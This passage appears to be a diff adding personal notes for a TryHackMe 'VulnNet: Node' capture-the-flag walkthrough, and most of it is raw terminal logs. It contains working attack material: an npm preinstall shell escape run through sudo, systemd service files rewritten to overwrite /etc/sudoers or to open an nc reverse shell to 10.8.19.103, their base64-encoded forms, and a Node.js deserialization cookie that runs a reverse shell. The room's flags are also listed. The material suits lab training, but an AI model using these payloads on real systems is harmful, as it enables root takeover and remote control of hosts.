@@ -243,3 +243,248 @@ www@vulnnet-node:/home$ chmod 777 $TF           chmod 777 $TF
 chmod 777 $TF
 www@vulnnet-node:/home$ sudo -u serv-manage /usrsudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
 sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
+
+> @ preinstall /tmp/tmp.jeRgicyAcT
+> /bin/sh
+```
+```text
+$ id
+id
+uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
+
+the command is like this:
+
+TF=$(mktemp -d) 
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json 
+chmod 777 $TF 
+sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
+
+> @ preinstall /tmp/tmp.jeRgicyAcT
+> /bin/sh
+```
+```text
+$ id
+id
+uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
+```
+
+## Privilege Escalation
+```text
+$ /bin/bash
+serv-manage@vulnnet-node:/tmp/tmp.jeRgicyAcT$                                               cd /home/serv-manage
+cd /home/serv-manage
+serv-manage@vulnnet-node:~$ ls                          ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+serv-manage@vulnnet-node:~$ cat user.txt                cat user.txt
+cat user.txt
+THM{064640a2f880ce9ed7a54886f1bde821}
+serv-manage@vulnnet-node:~$ 
+
+privesc
+
+serv-manage@vulnnet-node:~$ sudo -l                     sudo -l
+sudo -l
+Matching Defaults entries for serv-manage on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User serv-manage may run the following commands on vulnnet-node:
+    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl daemon-reload
+
+With systemctl status we can find the path of the timer file
+
+serv-manage@vulnnet-node:~$ systemctl status vulnnet-auto.timer
+systemctl status vulnnet-auto.timer
+● vulnnet-auto.timer - Run VulnNet utilities every 30 min
+   Loaded: loaded (/etc/systemd/system/vulnnet-auto.timer; disabled; vendor pres
+   Active: inactive (dead)
+  Trigger: n/a
+
+serv-manage@vulnnet-node:~$ ls -lh /etc/systemd/system/vulnnet-auto.timer
+ls -lh /etc/systemd/system/vulnnet-auto.timer
+-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
+
+serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
+cat /etc/systemd/system/vulnnet-auto.timer
+[Unit]
+Description=Run VulnNet utilities every 30 min
+
+[Timer]
+OnBootSec=0min
+```
+```text
+# 30 min job
+OnCalendar=*:0/30
+Unit=vulnnet-job.service
+
+[Install]
+WantedBy=basic.target
+
+The timer is starting a job after 30min.
+
+We can find the service and see it is writable by serv-manage
+
+serv-manage@vulnnet-node:~$ systemctl status vulnnet-job.service
+systemctl status vulnnet-job.service
+● vulnnet-job.service - Logs system statistics to the systemd journal
+   Loaded: loaded (/etc/systemd/system/vulnnet-job.service; disabled; vendor pre
+   Active: inactive (dead)
+
+serv-manage@vulnnet-node:~$ ls -lh /etc/systemd/system/vulnnet-job.service
+ls -lh /etc/systemd/system/vulnnet-job.service
+-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
+
+serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
+cat /etc/systemd/system/vulnnet-job.service
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+
+[Service]
+```
+```text
+# Gather system statistics
+Type=forking
+ExecStart=/bin/df
+
+[Install]
+WantedBy=multi-user.target
+
+cnnot write with nano 
+
+so just using echo :)
+
+1st way
+
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+[Service]
+```
+```text
+# Gather system statistics
+Type=forking
+#ExecStart=/bin/df
+ExecStart=/bin/sh -c 'echo "serv-manage ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
+[Install]
+WantedBy=multi-user.target
+
+and base64 will be
+
+W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vc2ggLWMgJ2VjaG8gInNlcnYtbWFuYWdlIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTCIgPiAvZXRjL3N1ZG9lcnMnCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=
+
+second way
+
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+[Service]
+```
+```text
+# Gather system statistics
+Type=forking
+#ExecStart=/bin/df
+ExecStart=/bin/bash -c 'rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.8.19.103 1337 > /tmp/g'
+[Install]
+WantedBy=multi-user.target
+
+and base64 will be
+
+W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==
+
+let's do the second method
+
+echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/systemd/system/vulnnet-job.service
+
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$                                               echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/systemd/system/vulnnet-job.service
+temd/system/vulnnet-job.service1bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/syst
+
+now stop the timer, reload modified files on disk and start the timer
+
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl stop vulnnet-auto.timer
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$  sudo /bin/systemctl daemon-reload
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$   sudo /bin/systemctl start vulnnet-auto.timer
+
+revshell
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.232.157.
+Ncat: Connection from 10.10.232.157:58802.
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+# whoami;cat /root/root.txt
+root
+THM{abea728f211b105a608a720a37adabf9}
+
+:)
+
+now the 1st way
+
+echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vc2ggLWMgJ2VjaG8gInNlcnYtbWFuYWdlIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTCIgPiAvZXRjL3N1ZG9lcnMnCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' | base64 -d > /etc/systemd/system/vulnnet-job.service
+
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtecho 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vc2ggLWMgJ2VjaG8gInNlcnYtbWFuYWdlIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTCIgPiAvZXRjL3N1ZG9lcnMnCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' | base64 -d > /etc/systemd/system/vulnnet-job.service
+
+dWx0aS11c2VyLnRhcmdldAo=' | base64 -d > /etc/systemd/system/vulnnet-job.servicetd
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ 
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -l                                       sudo -l
+sudo -l
+Matching Defaults entries for serv-manage on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User serv-manage may run the following commands on vulnnet-node:
+    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl daemon-reload
+
+again stop the timer
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl stop vulnnet-auto.timer
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl daemon-reload
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl start vulnnet-auto.timer
+
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -l                                       sudo -l
+sudo -l
+User serv-manage may run the following commands on vulnnet-node:
+    (root) NOPASSWD: ALL
+serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -s                                       sudo -s
+sudo -s
+root@vulnnet-node:/tmp/tmp.DHRcCalyiZ# cat /root/root.txt                     cat /root/root.txt
+cat /root/root.txt
+THM{abea728f211b105a608a720a37adabf9}
+
+:)
+
+it works
+
+another cookie (nodejs de-serialization)
+
+https://blog.gibbons.digital/hacking/2021/04/04/node.html
+
+{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f')}()","isGuest":false,"encoding": "utf-8"}
+
+eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgMTAuOC4xOS4xMDMgNDQ0NCA%2BL3RtcC9mJyl9KCkiLCJpc0d1ZXN0IjpmYWxzZSwiZW5jb2RpbmciOiAidXRmLTgifQo%3D
+
+:)
+```
+![[Pasted image 20221228222341.png]]
+![[Pasted image 20221228225026.png]]
+What is the user flag? (user.txt)
+What is the root flag? (root.txt)
+
+## Flags / Answers
+- ***THM{064640a2f880ce9ed7a54886f1bde821}***
+- ***THM{abea728f211b105a608a720a37adabf9}***
+
+## Notes / Lessons Learned
+[[Brooklyn Nine Nine]]
+
